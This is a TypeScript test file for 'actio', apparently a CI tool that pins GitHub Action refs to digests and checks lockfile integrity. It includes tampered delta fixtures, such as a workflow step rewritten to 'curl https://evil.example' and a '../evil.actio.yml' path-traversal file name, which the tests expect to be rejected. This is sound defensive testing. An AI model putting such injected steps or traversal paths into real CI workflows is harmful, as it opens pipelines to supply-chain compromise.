import { createHash } from "node:crypto";
import { existsSync } from "node:fs";
import { mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import {
  type PinResolver,
  resolveImportToImmutable,
  runPinsApplyConstrained,
  runPinsCheck,
  runPinsUpdate,
} from "./pins.js";

const ACTION = "foo/bar";
const D1 = "1111111111111111111111111111111111111111";
const D2 = "2222222222222222222222222222222222222222";

const toIntegrity = (text: string): string =>
  `sha256:${createHash("sha256").update(text).digest("hex")}`;

const makeResolver = (args: {
  resolutions: Record<string, string>;
  bytes: Record<string, string>;
}): PinResolver => ({
  resolveToImmutable: async ({ id, ref }) => args.resolutions[`${id}@${ref}`] ?? ref,
  fetchByImmutable: async ({ id }, immutableRef) =>
    new TextEncoder().encode(args.bytes[`${id}@${immutableRef}`] ?? `${id}@${immutableRef}`),
});

const TMP_DIRS: string[] = [];

const setupWorkspace = async (params: {
  sourceRef: string;
  lockSourceRef?: string;
  generatedDigest: string;
  generatedRef: string;
  lockDigest: string;
  lockIntegrity: string;
}): Promise<string> => {
  const dir = await mkdtemp(path.join(tmpdir(), "actio-pins-"));
  TMP_DIRS.push(dir);
  await mkdir(path.join(dir, ".github", "actio"), { recursive: true });
  await mkdir(path.join(dir, ".github", "workflows"), { recursive: true });
  const source = [
    "jobs:",
    "  build:",
    "    runs-on: ubuntu-latest",
    "    steps:",
    `      - uses: ${ACTION}@${params.sourceRef}`,
    "",
  ].join("\n");
  const generated = [
    "jobs:",
    "  build:",
    "    runs-on: ubuntu-latest",
    "    steps:",
    `      - uses: ${ACTION}@${params.generatedDigest} # ${params.generatedRef}`,
    "",
  ].join("\n");
  const lock = {
    version: 1,
    actions: {
      [ACTION]: {
        action: ACTION,
        sourceRef: params.lockSourceRef ?? params.sourceRef,
        digest: params.lockDigest,
        integrity: params.lockIntegrity,
        resolvedAt: "2026-01-01T00:00:00.000Z",
      },
    },
    imports: {},
  };
  await writeFile(path.join(dir, ".github", "actio", "ci.actio.yml"), source, "utf8");
  await writeFile(path.join(dir, ".github", "workflows", "ci.yml"), generated, "utf8");
  await writeFile(path.join(dir, "actio.lock"), `${JSON.stringify(lock, null, 2)}\n`, "utf8");
  return dir;
};

afterEach(async () => {
  await Promise.all(
    TMP_DIRS.splice(0, TMP_DIRS.length).map((dir) => rm(dir, { recursive: true, force: true })),
  );
});

describe("pins check exit code matrix", () => {
  it("returns 0 when source, generated output, and lock are aligned", async () => {
    const resolver = makeResolver({
      resolutions: { [`${ACTION}@v1`]: D1 },
      bytes: { [`${ACTION}@${D1}`]: "bytes-v1" },
    });
    const dir = await setupWorkspace({
      sourceRef: "v1",
      generatedDigest: D1,
      generatedRef: "v1",
      lockDigest: D1,
      lockIntegrity: toIntegrity("bytes-v1"),
    });
    const code = await runPinsCheck([path.join(".github", "actio", "ci.actio.yml")], {
      cwd: dir,
      resolver,
    });
    expect(code).toBe(0);
  });

  it("returns 1 when the ref resolves to a new digest (benign drift)", async () => {
    const resolver = makeResolver({
      resolutions: { [`${ACTION}@v1`]: D2 },
      bytes: {
        [`${ACTION}@${D1}`]: "bytes-old",
        [`${ACTION}@${D2}`]: "bytes-new",
      },
    });
    const dir = await setupWorkspace({
      sourceRef: "v1",
      generatedDigest: D1,
      generatedRef: "v1",
      lockDigest: D1,
      lockIntegrity: toIntegrity("bytes-old"),
    });
    const code = await runPinsCheck([path.join(".github", "actio", "ci.actio.yml")], {
      cwd: dir,
      resolver,
    });
    expect(code).toBe(1);
  });

  it("returns 2 when the lock integrity no longer matches fetched bytes", async () => {
    const resolver = makeResolver({
      resolutions: { [`${ACTION}@v1`]: D1 },
      bytes: { [`${ACTION}@${D1}`]: "bytes-v1" },
    });
    const dir = await setupWorkspace({
      sourceRef: "v1",
      generatedDigest: D1,
      generatedRef: "v1",
      lockDigest: D1,
      lockIntegrity: "sha256:0000000000000000000000000000000000000000000000000000000000000000",
    });
    const code = await runPinsCheck([path.join(".github", "actio", "ci.actio.yml")], {
      cwd: dir,
      resolver,
    });
    expect(code).toBe(2);
  });
});

describe("pins update --no-exec", () => {
  it("never invokes build execution when --no-exec is set", async () => {
    let buildCalls = 0;
    const resolver = makeResolver({
      resolutions: {
        [`${ACTION}@v1`]: D1,
        [`${ACTION}@v2`]: D2,
      },
      bytes: {
        [`${ACTION}@${D1}`]: "bytes-v1",
        [`${ACTION}@${D2}`]: "bytes-v2",
      },
    });
    const dir = await setupWorkspace({
      sourceRef: "v2",
      lockSourceRef: "v1",
      generatedDigest: D1,
      generatedRef: "v1",
      lockDigest: D1,
      lockIntegrity: toIntegrity("bytes-v1"),
    });

    const code = await runPinsUpdate([path.join(".github", "actio", "ci.actio.yml")], {
      cwd: dir,
      noExec: true,
      resolver,
      runBuild: async () => {
        buildCalls += 1;
      },
      deltaOut: path.join(".actio", "pins-delta.json"),
    });

    expect(code).toBe(0);
    expect(buildCalls).toBe(0);
    const updatedSource = await readFile(
      path.join(dir, ".github", "actio", "ci.actio.yml"),
      "utf8",
    );
    expect(updatedSource).toContain(`${ACTION}@v2`);
  });

  it("invokes build execution when --no-exec is not set", async () => {
    let buildCalls = 0;
    const resolver = makeResolver({
      resolutions: {
        [`${ACTION}@v1`]: D1,
        [`${ACTION}@v2`]: D2,
      },
      bytes: {
        [`${ACTION}@${D1}`]: "bytes-v1",
        [`${ACTION}@${D2}`]: "bytes-v2",
      },
    });
    const dir = await setupWorkspace({
      sourceRef: "v2",
      lockSourceRef: "v1",
      generatedDigest: D1,
      generatedRef: "v1",
      lockDigest: D1,
      lockIntegrity: toIntegrity("bytes-v1"),
    });

    const code = await runPinsUpdate([path.join(".github", "actio", "ci.actio.yml")], {
      cwd: dir,
      noExec: false,
      resolver,
      runBuild: async () => {
        buildCalls += 1;
      },
      deltaOut: path.join(".actio", "pins-delta.json"),
    });

    expect(code).toBe(0);
    expect(buildCalls).toBe(1);
  });

  it("treats source .actio.yml refs as authoritative over generated comments", async () => {
    const resolver = makeResolver({
      resolutions: {
        [`${ACTION}@v1`]: D1,
        [`${ACTION}@v2`]: D2,
      },
      bytes: {
        [`${ACTION}@${D1}`]: "bytes-v1",
        [`${ACTION}@${D2}`]: "bytes-v2",
      },
    });
    const dir = await setupWorkspace({
      sourceRef: "v2",
      generatedDigest: D1,
      generatedRef: "v1",
      lockDigest: D1,
      lockIntegrity: toIntegrity("bytes-v1"),
    });

    const code = await runPinsUpdate([path.join(".github", "actio", "ci.actio.yml")], {
      cwd: dir,
      noExec: true,
      resolver,
      deltaOut: path.join(".actio", "pins-delta.json"),
    });

    expect(code).toBe(0);
    const source = await readFile(path.join(dir, ".github", "actio", "ci.actio.yml"), "utf8");
    const generated = await readFile(path.join(dir, ".github", "workflows", "ci.yml"), "utf8");
    const lock = JSON.parse(await readFile(path.join(dir, "actio.lock"), "utf8")) as {
      actions: Record<string, { sourceRef: string; digest: string }>;
    };
    expect(source).toContain(`${ACTION}@v2`);
    expect(generated).toContain(`${ACTION}@${D2} # v2`);
    expect(lock.actions[ACTION]?.sourceRef).toBe("v2");
    expect(lock.actions[ACTION]?.digest).toBe(D2);
  });

  it("preserves resolvedAt when lock entries are unchanged", async () => {
    const resolver = makeResolver({
      resolutions: { [`${ACTION}@v1`]: D1 },
      bytes: { [`${ACTION}@${D1}`]: "bytes-v1" },
    });
    const dir = await setupWorkspace({
      sourceRef: "v1",
      generatedDigest: D1,
      generatedRef: "v1",
      lockDigest: D1,
      lockIntegrity: toIntegrity("bytes-v1"),
    });

    const code = await runPinsUpdate([path.join(".github", "actio", "ci.actio.yml")], {
      cwd: dir,
      noExec: true,
      resolver,
    });

    expect(code).toBe(0);
    const lock = JSON.parse(await readFile(path.join(dir, "actio.lock"), "utf8")) as {
      actions: Record<string, { resolvedAt: string }>;
    };
    expect(lock.actions[ACTION]?.resolvedAt).toBe("2026-01-01T00:00:00.000Z");
  });

  it("warns and exits 0 without creating actio.lock when no files match", async () => {
    const dir = await mkdtemp(path.join(tmpdir(), "actio-pins-empty-"));
    TMP_DIRS.push(dir);

    const code = await runPinsUpdate([path.join(".github", "actio", "*.actio.yml")], {
      cwd: dir,
      noExec: true,
    });

    expect(code).toBe(0);
    expect(existsSync(path.join(dir, "actio.lock"))).toBe(false);
  });
});

describe("pins apply --constrained", () => {
  it("accepts a valid three-artifact delta", async () => {
    const resolver = makeResolver({
      resolutions: {
        [`${ACTION}@v1`]: D1,
        [`${ACTION}@v2`]: D2,
      },
      bytes: {
        [`${ACTION}@${D1}`]: "bytes-v1",
        [`${ACTION}@${D2}`]: "bytes-v2",
      },
    });
    const computeDir = await setupWorkspace({
      sourceRef: "v2",
      lockSourceRef: "v1",
      generatedDigest: D1,
      generatedRef: "v1",
      lockDigest: D1,
      lockIntegrity: toIntegrity("bytes-v1"),
    });

    const updateCode = await runPinsUpdate([path.join(".github", "actio", "ci.actio.yml")], {
      cwd: computeDir,
      noExec: true,
      resolver,
      deltaOut: path.join(".actio", "pins-delta.json"),
    });
    expect(updateCode).toBe(0);
    const delta = await readFile(path.join(computeDir, ".actio", "pins-delta.json"), "utf8");

    const applyDir = await setupWorkspace({
      sourceRef: "v1",
      generatedDigest: D1,
      generatedRef: "v1",
      lockDigest: D1,
      lockIntegrity: toIntegrity("bytes-v1"),
    });
    await mkdir(path.join(applyDir, ".actio"), { recursive: true });
    await writeFile(path.join(applyDir, ".actio", "pins-delta.json"), delta, "utf8");

    const applyCode = await runPinsApplyConstrained(path.join(".actio", "pins-delta.json"), {
      cwd: applyDir,
      resolver,
    });
    expect(applyCode).toBe(0);

    const source = await readFile(path.join(applyDir, ".github", "actio", "ci.actio.yml"), "utf8");
    const lock = JSON.parse(await readFile(path.join(applyDir, "actio.lock"), "utf8")) as {
      actions: Record<string, { digest: string; integrity: string }>;
    };
    expect(source).toContain(`${ACTION}@v2`);
    expect(lock.actions[ACTION]?.digest).toBe(D2);
    expect(lock.actions[ACTION]?.integrity).toBe(toIntegrity("bytes-v2"));

    const checkCode = await runPinsCheck([path.join(".github", "actio", "ci.actio.yml")], {
      cwd: applyDir,
      resolver,
    });
    expect(checkCode).toBe(0);
  });

  it("rejects a delta whose source edit is not a uses ref bump (exit 2)", async () => {
    const dir = await setupWorkspace({
      sourceRef: "v1",
      generatedDigest: D2,
      generatedRef: "v2",
      lockDigest: D1,
      lockIntegrity: toIntegrity("bytes-v1"),
    });
    const delta = {
      version: 1,
      action: ACTION,
      sourceFile: path.join(".github", "actio", "ci.actio.yml"),
      generatedFile: path.join(".github", "workflows", "ci.yml"),
      lockFile: "actio.lock",
      fromRef: "v1",
      toRef: "v2",
      fromDigest: D1,
      toDigest: D2,
      sourceEdit: {
        search: `      - uses: ${ACTION}@v1`,
        replace: "      - run: curl https://evil.example",
      },
      generatedEdit: {
        search: `      - uses: ${ACTION}@${D2} # v2`,
        replace: `      - uses: ${ACTION}@${D2} # v2`,
      },
    };
    await mkdir(path.join(dir, ".actio"), { recursive: true });
    await writeFile(
      path.join(dir, ".actio", "pins-delta.json"),
      `${JSON.stringify(delta)}\n`,
      "utf8",
    );
    const code = await runPinsApplyConstrained(path.join(".actio", "pins-delta.json"), {
      cwd: dir,
    });
    expect(code).toBe(2);
  });

  it("rejects a delta whose generated edit does not preserve the ref comment (exit 2)", async () => {
    const dir = await setupWorkspace({
      sourceRef: "v1",
      generatedDigest: D1,
      generatedRef: "v1",
      lockDigest: D1,
      lockIntegrity: toIntegrity("bytes-v1"),
    });
    const delta = {
      version: 1,
      action: ACTION,
      sourceFile: path.join(".github", "actio", "ci.actio.yml"),
      generatedFile: path.join(".github", "workflows", "ci.yml"),
      lockFile: "actio.lock",
      fromRef: "v1",
      toRef: "v2",
      fromDigest: D1,
      toDigest: D2,
      sourceEdit: {
        search: `      - uses: ${ACTION}@v1`,
        replace: `      - uses: ${ACTION}@v2`,
      },
      generatedEdit: {
        search: `      - uses: ${ACTION}@${D1} # v1`,
        replace: `      - uses: ${ACTION}@${D2} # not-v2`,
      },
    };
    await mkdir(path.join(dir, ".actio"), { recursive: true });
    await writeFile(
      path.join(dir, ".actio", "pins-delta.json"),
      `${JSON.stringify(delta)}\n`,
      "utf8",
    );
    const code = await runPinsApplyConstrained(path.join(".actio", "pins-delta.json"), {
      cwd: dir,
    });
    expect(code).toBe(2);
  });

  it("rejects a delta when lockfile state does not match fromDigest/fromRef (exit 2)", async () => {
    const dir = await setupWorkspace({
      sourceRef: "v1",
      generatedDigest: D1,
      generatedRef: "v1",
      lockDigest: D2,
      lockIntegrity: toIntegrity("bytes-v2"),
    });
    const delta = {
      version: 1,
      action: ACTION,
      sourceFile: path.join(".github", "actio", "ci.actio.yml"),
      generatedFile: path.join(".github", "workflows", "ci.yml"),
      lockFile: "actio.lock",
      fromRef: "v1",
      toRef: "v2",
      fromDigest: D1,
      toDigest: D2,
      sourceEdit: {
        search: `      - uses: ${ACTION}@v1`,
        replace: `      - uses: ${ACTION}@v2`,
      },
      generatedEdit: {
        search: `      - uses: ${ACTION}@${D1} # v1`,
        replace: `      - uses: ${ACTION}@${D2} # v2`,
      },
    };
    await mkdir(path.join(dir, ".actio"), { recursive: true });
    await writeFile(
      path.join(dir, ".actio", "pins-delta.json"),
      `${JSON.stringify(delta)}\n`,
      "utf8",
    );
    const code = await runPinsApplyConstrained(path.join(".actio", "pins-delta.json"), {
      cwd: dir,
    });
    expect(code).toBe(2);
  });

  it("rejects a delta that attempts path traversal outside the workspace (exit 2)", async () => {
    const dir = await setupWorkspace({
      sourceRef: "v1",
      generatedDigest: D1,
      generatedRef: "v1",
      lockDigest: D1,
      lockIntegrity: toIntegrity("bytes-v1"),
    });
    const delta = {
      version: 1,
      action: ACTION,
      sourceFile: path.join("..", "evil.actio.yml"),
      generatedFile: path.join(".github", "workflows", "ci.yml"),
      lockFile: "actio.lock",
      fromRef: "v1",
      toRef: "v2",
      fromDigest: D1,
      toDigest: D2,
      sourceEdit: {
        search: `      - uses: ${ACTION}@v1`,
        replace: `      - uses: ${ACTION}@v2`,
      },
      generatedEdit: {
        search: `      - uses: ${ACTION}@${D1} # v1`,
        replace: `      - uses: ${ACTION}@${D2} # v2`,
      },
    };
    await mkdir(path.join(dir, ".actio"), { recursive: true });
    await writeFile(
      path.join(dir, ".actio", "pins-delta.json"),
      `${JSON.stringify(delta)}\n`,
      "utf8",
    );
    const code = await runPinsApplyConstrained(path.join(".actio", "pins-delta.json"), {
      cwd: dir,
    });
    expect(code).toBe(2);
  });

  it("returns exit 2 for malformed constrained delta JSON", async () => {
    const dir = await setupWorkspace({
      sourceRef: "v1",
      generatedDigest: D1,
      generatedRef: "v1",
      lockDigest: D1,
      lockIntegrity: toIntegrity("bytes-v1"),
    });
    await mkdir(path.join(dir, ".actio"), { recursive: true });
    await writeFile(path.join(dir, ".actio", "pins-delta.json"), "{broken-json", "utf8");
    const code = await runPinsApplyConstrained(path.join(".actio", "pins-delta.json"), {
      cwd: dir,
    });
    expect(code).toBe(2);
  });
});

describe("import resolver ordering", () => {
  it("resolves immutable first, fetches by immutable, hashes fetched bytes, records, then parses", async () => {
    const callOrder: string[] = [];
    const immutable = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
    const fetchedText = "fragments:\n  setup:\n    - run: echo hi\n";
    const resolver: PinResolver = {
      resolveToImmutable: async () => {
        callOrder.push("resolve");
        return immutable;
      },
      fetchByImmutable: async (_request, digest) => {
        callOrder.push("fetch");
        expect(digest).toBe(immutable);
        return new TextEncoder().encode(fetchedText);
      },
    };
    let recordedIntegrity = "";
    let parsedContent = "";
    const entry = await resolveImportToImmutable(
      resolver,
      "github.com/acme/lib/setup.actio.yml@v1",
      "2026-06-18T00:00:00.000Z",
      {
        record: (lockEntry) => {
          callOrder.push("record");
          recordedIntegrity = lockEntry.integrity;
        },
        parseImport: (content) => {
          callOrder.push("parse");
          parsedContent = content;
        },
      },
    );

    expect(callOrder).toEqual(["resolve", "fetch", "record", "parse"]);
    expect(entry.integrity).toBe(toIntegrity(fetchedText));
    expect(recordedIntegrity).toBe(toIntegrity(fetchedText));
    expect(parsedContent).toBe(fetchedText);
  });
});
